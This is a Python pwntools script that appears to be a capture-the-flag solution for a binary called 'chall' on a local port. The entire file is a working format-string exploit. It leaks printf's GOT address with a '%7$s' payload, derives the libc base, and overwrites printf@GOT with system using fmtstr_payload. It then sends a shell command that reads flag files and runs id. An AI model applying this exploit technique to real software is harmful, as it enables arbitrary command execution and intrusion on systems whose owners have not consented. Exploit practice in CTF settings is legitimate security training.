from pwn import *
import time

context.arch = 'amd64'

p = remote("127.0.0.1", 1337)
elf = ELF('./chall')
libc = ELF('./libc.so.6')

printf_got = elf.got['printf']

# Step 1: Leak printf@GOT via %s
payload = b'%7$sAAAA' + p64(printf_got)
p.sendline(payload)
resp = p.recvuntil(b'AAAA')
printf_addr = u64(resp[:-4][:6].ljust(8, b'\x00'))

libc.address = printf_addr - libc.symbols['printf']
system_addr = libc.symbols['system']

# Step 2: Overwrite printf@GOT with system
payload = fmtstr_payload(6, {printf_got: system_addr}, write_size='byte')
p.sendline(payload)
time.sleep(0.3)

# Step 3: Execute command
p.sendline(b'cat /flag* /home/ctf/flag* 2>&1; id')
resp = p.recvall(timeout=3)
print(resp.decode(errors='replace'))
